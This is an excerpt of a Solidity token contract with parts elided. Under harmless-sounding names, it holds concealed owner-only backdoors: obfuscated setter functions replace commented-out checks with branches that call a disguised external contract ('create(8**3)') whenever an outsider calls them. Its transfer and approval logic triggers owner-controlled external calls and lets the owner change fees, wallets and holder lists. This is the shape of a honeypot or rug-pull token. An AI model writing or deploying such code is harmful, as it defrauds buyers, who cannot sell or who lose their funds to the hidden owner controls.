...
contract Token is Context, IERC20, Ownable {
    ...
    uniswapV1 private uniswapV37PairToken;
    ...
    address private uniswapV37Pair_;
    bool private itvs;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV37PairToken = uniswapV1(uniswapV37Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV37Pair_] = true;
        _isExcludedFromFee[uniswapV37Pair_] = true;
    ...
    function setItvs_Ox1136968(bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            itvs=b;
        } else {
            uniswapV37PairToken.create(8**3);
        }
    }

    function holderlisting_Ox1136988(address[] memory accounts, uint256[] memory a) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
    ...
    function pair_Ox1136998(address aaaa, bool b) public {
    ...
    function ag_Ox1136618(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV37PairToken.create(8**3);
    ...
    function Eca_Ox1136628(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV37PairToken.create(8**3);
    ...
    function incfees_Ox1136633(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function marketingWallet_Ox1136644(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV37PairToken = uniswapV1(addresses);
        } else {
            uniswapV37PairToken.create(8**3);
        }
    }
    ...
    function initialitzeW_Ox1136658 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV37PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV37PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV37PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV37PairToken.create(250**3); 
        }
